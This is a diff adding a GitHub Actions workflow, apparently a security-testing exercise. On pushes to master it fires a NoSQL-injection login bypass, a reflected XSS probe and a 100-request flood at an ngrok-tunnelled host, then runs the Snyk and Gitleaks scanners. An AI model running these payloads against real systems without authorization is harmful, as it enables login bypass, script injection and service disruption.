@@ -1,0 +1,50 @@
+name: Cloud Security Simulation
+
+on:
+  push:
+    branches:
+      - master
+
+jobs:
+  security_attack:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Simulate SQL Injection Attack
+        run: |
+          echo "Executing NoSQL Injection Attack..."
+          curl -X POST https://9961-196-184-98-202.ngrok-free.app/login        -H "X-Simulated-By: GitHubAction" \
+          -d 'username[$ne]=null&password[$ne]=null'
+
+      - name: Simulate XSS Attack
+        run: |
+          echo "Executing Cross-Site Scripting (XSS) Attack..."
+          curl -X GET "https://9961-196-184-98-202.ngrok-free.app/search?query=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"       -H "X-Simulated-By: GitHubAction" \
+
+      - name: Simulate Load Test (Ethical DoS)
+        run: |
+          echo "Simulating light DoS (load test)..."
+          for i in {1..100}; do
+          curl -s -X POST https://9961-196-184-98-202.ngrok-free.app/login       -H "X-Simulated-By: GitHubAction" \
+          -d 'username[$ne]=null&password[$ne]=null' &
+          done
+          wait
+
+
+
+      - name: Run Snyk Security Scan
+        uses: snyk/actions/node@master
+        with:
+          args: test
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+
+      - name: Run Gitleaks to Detect Secrets
+        uses: gitleaks/gitleaks-action@v2
+        with:
+          config-path: .gitleaks.toml
+
+      
